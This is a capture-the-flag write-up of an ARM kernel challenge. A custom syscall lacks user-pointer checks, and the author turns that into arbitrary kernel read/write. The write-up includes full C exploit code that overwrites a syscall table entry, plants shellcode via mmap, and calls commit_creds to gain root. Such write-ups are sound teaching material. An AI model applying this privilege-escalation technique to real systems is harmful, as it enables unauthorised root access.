# Syscall (arm7vl, kernel, missing copy-from-user)

I've really enjoyed this challenge. It was first time I've exploited different architecture then x86. Moreover it required to write some shellcode in arm. Lastly it was a kernel exploitation challenge which I always find super cool!

## Enumeration
In this challenge we are given a source code of a short kernel module. It adds in a kind of drastic way a new syscall to syscall table (sys_upper):

```c
asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}
```

The syscall logic is very simple. It converts all lowercase letters to uppercase. User can use it as any other system call:

```c
#define NR_SYS_UNUSED 223

int main() {
    char *in = "Ala ma kota";
    char *out = malloc(12);

    syscall(NR_SYS_UNUSED, in, out);
    printf("out: %s\n", out); // result "out: ALA MA KOTA"
    return 0;
}
```

The question is, where is the vulnerability. If you have ever saw any piece of code in kernel space you are perhaps familiar with: [copy_from_user](https://www.fsl.cs.sunysb.edu/kernel-api/re257.html), [copy_to_user](https://www.fsl.cs.sunysb.edu/kernel-api/re256.html) functions. Anytime a kernel takes arguments from user it must make sure it belong to the userland which is done using these functions. Why? Well in a moment you will see what happens when user provide kernel space address as an argument.

## Exploitation
As I've mentioned above the vulnerability lies in lack of copy_from_user & copy_to_user calls. Now let's see how can we abuse it to gain arbitrary read and write.

### Arbitrary read
If user provide kernel address as `in` parameter, the kernel will read the memory from this address, modify it and save the result in `out` buffer. Of course the kernel will modify all bytes from [0x61, 0x7a] range.

### Arbitrary write
If user provide kernel address as `out` parameter, the kernel will try to save the result of modified string `in` to it. This was we can overwrite any kernel writable memory. Of course we won't be able to place characters from [0x61, 0x7a] and null bytes as the first ones will be treated as lowercase letters and transformed to uppercase, while the null byte simply cannot be part of a string.

### Example of arbitrary read/write
Now let's test arbitrary read & write. We will overwrite an entry from kernel syscall table with "AAAA" (0x41414141):

```c
#define SYS_CALL_TABLE 0x8000e348
#define NR_SYS_UNUSED 223

uint32_t read_dword(void *addr)
{
    int i;
    /* Allocate and clean memory to store read result. */
    char read_buf[0x1000];
    memset(read_buf, 0x0, sizeof(read_buf));

    size_t read_bytes = 0;
    do
    {
        /* Read memory till reaching null byte. */
        syscall(NR_SYS_UNUSED, addr + read_bytes, &read_buf[read_bytes]);
        /* Check how many bytes we have managed to read. */
        read_bytes = strlen(read_buf) + 1;
    } while (read_bytes < 4);

    /* We cannot revert sys_upper, so return value might be wrong. */

    return *((uint32_t *)read_buf);
}

int main()
{
    uint32_t **syscall_table = (uint32_t **)SYS_CALL_TABLE;

    printf("[d] Before: %p\n", (void *)read_dword(&syscall_table[80]));
    syscall(NR_SYS_UNUSED, "AAAA", &syscall_table[80]);
    printf("[d] After: %p\n", (void *)read_dword(&syscall_table[80]));

    return 0;
}
```

```console
/tmp $ ./exp
[d] Before: 0x80060b04
[d] After: 0x41414141
```

Ha, so we can add our own syscall! What we want to do is to create our own function `userland_escalate` which will be executed in ring0 and which will escalate our privileges to root.

```c
#define SYS_CALL_TABLE 0x8000e348
#define NR_SYS_UNUSED 223
#define COMMIT_CREDS ((void*) 0x8003f56c)
#define PREPARE_KERNEL_CREDS ((void*) 0x8003f924)

typedef void* (*prepare_kernel_creds_func_t)(void* daemon);
typedef int (*commit_creds_func_t)(void *new);

#define prepare_kernel_creds_func(daemon) \
    (((prepare_kernel_creds_func_t) PREPARE_KERNEL_CREDS)(daemon))
#define commit_creds_func(new) \
    (((commit_creds_func_t)(COMMIT_CREDS))(new))

long userland_escalate() {
    commit_creds_func(prepare_kernel_creds_func(NULL));
    return 0;
}

uint32_t read_dword(void *addr)
{
    // same as above
    [...]
}

int main()
{
    uint32_t **syscall_table = (uint32_t **)SYS_CALL_TABLE;

    printf("[d] Before: %p\n", (void *)read_dword(&syscall_table[80]));
    syscall(NR_SYS_UNUSED, &userland_escalate, &syscall_table[80]);
    printf("[d] After: %p\n", (void *)read_dword(&syscall_table[80]));

    return 0;
}
```

The `commit_creds` and `prepare_kernel_creds` functions are standard kernel functions used by attackers to escalate their privileges. As there is no kaslr enabled in the system we can get their addresses from `/proc/kallsyms`:

```console
$ cat /proc/cmdline 
'root=/dev/ram rw console=ttyAMA0 rdinit=/sbin/init' ; no kaslr listed

$ cat /proc/kallsyms | grep commit_creds
8003f56c T commit_creds ; address of commit_creds function
8044548c r __ksymtab_commit_creds
8044ffc8 r __kstrtab_commit_creds

$ cat /proc/kallsyms | grep prepare_kernel_cred
8003f924 T prepare_kernel_cred ; address of prepare_kernel_cred function
80447f34 r __ksymtab_prepare_kernel_cred
8044ff8c r __kstrtab_prepare_kernel_cred
```

### Userland functions contain null bytes
Ok, so why the above code snippet won't work? Well because userland .text is usually placed at the lower addresses and therefore we won't be able to copy an address of `userland_escalate` function into syscall table as it will almost for sure contain null bytes.

So how can we bypass this restriction? Well, we can use mmap force the system to allocate our escalate function at our address of choice. Of course now we will have to fill it with our shellcode. I didn't want to write every call by hand as it was first time I'm writing in arm assembly, so I decided to allocate space for bridge_function which will just pass the execution to my userland_escalate function.
The bridge function will be created dynamicaly will mmap + memcpy while userland_escalate could stay the same as above.

Full exploit:

```c
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define COMMIT_CREDS ((void*) 0x8003f56c)
#define PREPARE_KERNEL_CREDS ((void*) 0x8003f924)
#define SYS_CALL_TABLE 0x8000e348
#define NR_SYS_UNUSED 223

typedef void* (*prepare_kernel_creds_func_t)(void* daemon);
typedef int (*commit_creds_func_t)(void *new);

#define prepare_kernel_creds_func(daemon) \
    (((prepare_kernel_creds_func_t) PREPARE_KERNEL_CREDS)(daemon))

#define commit_creds_func(new) \
    (((commit_creds_func_t)(COMMIT_CREDS))(new))

uint32_t read_dword(void *addr)
{
    int i;
    /* Allocate and clean memory to store read result. */
    char read_buf[0x1000];
    memset(read_buf, 0x0, sizeof(read_buf));

    size_t read_bytes = 0;
    do
    {
        /* Read memory till reaching null byte. */
        syscall(NR_SYS_UNUSED, addr + read_bytes, &read_buf[read_bytes]);
        /* Check how many bytes we have managed to read. */
        read_bytes = strlen(read_buf) + 1;
    } while (read_bytes < 4);

    /* We cannot revert sys_upper, so return value might be wrong. */

    return *((uint32_t *)read_buf);
}

long userland_escalate()
{
    commit_creds_func(prepare_kernel_creds_func(NULL));
    return 0;
}

void *allocate_bridge_func()
{
    void *bridge_func, *ptr_userland_escalate;
    char bridge_func_body[] = {
        0x00, 0x48, 0x2d, 0xe9, // push {r11, lr}
        0x00, 0xb0, 0x8d, 0xe2, // add r11, sp, #0
        0x08, 0x20, 0x9f, 0xe5, // mov r2, [pc, #8]
        0x32, 0xff, 0x2f, 0xe1, // ldr r2
        0x00, 0xd0, 0x4b, 0xe2, // sub sp, r11, #0
        0x00, 0x88, 0xbd, 0xe8, // pop {r11, pc}
        0x41, 0x41, 0x41, 0x41  // fill with address of userland_escalate
    };
    ptr_userland_escalate = &userland_escalate;
    memcpy(&bridge_func_body[24], &ptr_userland_escalate, 4);

    bridge_func = mmap((void *)0x20202000, 0x1000, PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_FIXED | MAP_SHARED | MAP_LOCKED | MAP_POPULATE, -1, 0);
    if ((uint32_t) bridge_func == -1)
    {
        perror("[!] Failed to mmap");
        return NULL;
    }
    bridge_func += 0x20;

    memcpy(bridge_func, bridge_func_body, sizeof(bridge_func_body));
    return bridge_func;
}

int main()
{
    uint32_t **syscall_table;
    void *bridge_func;

    syscall_table = (uint32_t **)SYS_CALL_TABLE;
    bridge_func = allocate_bridge_func();
    if (!bridge_func)
        return -1;

    syscall(NR_SYS_UNUSED, &bridge_func, &syscall_table[80]);
    syscall(80);

    system("cat /root/flag");

    return 0;
}
```

```console
$ ./a.out 
[d] Before: 0x41414141
[d] After: 0x20202020
[d] Result of userland_escalate: 0
Co.....................//
```


## References:
- https://azeria-labs.com : Great tutorial about arm exploitation. I love the part about setting up a private lab.